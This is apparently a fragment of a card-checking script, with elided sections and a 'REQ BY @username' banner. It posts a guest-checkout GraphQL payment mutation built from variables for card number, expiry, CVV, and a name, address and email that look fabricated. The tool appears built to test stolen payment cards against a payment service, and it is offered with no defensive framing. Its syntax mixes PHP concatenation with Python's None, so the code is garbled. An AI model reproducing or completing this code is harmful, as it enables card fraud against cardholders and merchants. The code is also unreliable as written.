                                            ...
                                            city = "New York"
                                                ...
                                                city = "Auburn"
                                                    ...
                                                    |×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @username</b>",
                                                        ...
                                                        curl_setopt(ch, CURLOPT_COOKIEFILE, cookieFile)
                                                        curl_setopt(ch, CURLOPT_COOKIEJAR, cookieFile)
                                                        curl_setopt(ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            token: String!\n            card: CardInput!\n            phoneNumber: String\n            firstName: String\n            lastName: String\n            shippingAddress: AddressInput\n            billingAddress: AddressInput\n            email: String\n            currencyConversionType: CheckoutCurrencyConversionType\n            installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: token\n                card: card\n                phoneNumber: phoneNumber\n                firstName: firstName\n                lastName: lastName\n                email: email\n                shippingAddress: shippingAddress\n                billingAddress: billingAddress\n                currencyConversionType: currencyConversionType\n                installmentTerm: installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' . orden . '","card":{"cardNumber":"' . cc . '","expirationDate":"' . mes . '/' . ano . '","postalCode":"' . postcode . '","securityCode":"' . cvv . '"},"phoneNumber":"' . phone . '","firstName":"' . firstname . ' ","lastName":"' . lastname . '","billingAddress":{"givenName":"' . firstname . ' ","familyName":"' . lastname . '","line1":"' . street . '","line2":None,"city":"' . city . '","state":"' . state . '","postalCode":"' . postcode . '","country":"US"},"shippingAddress":{"givenName":"' . firstname . ' ","familyName":"' . lastname . '","line1":"' . street . '","line2":None,"city":"' . city . '","state":"' . state . '","postalCode":"' . postcode . '","country":"US"},"email":"' . email . '","currencyConversionType":"VENDOR"},"operationName":None}')
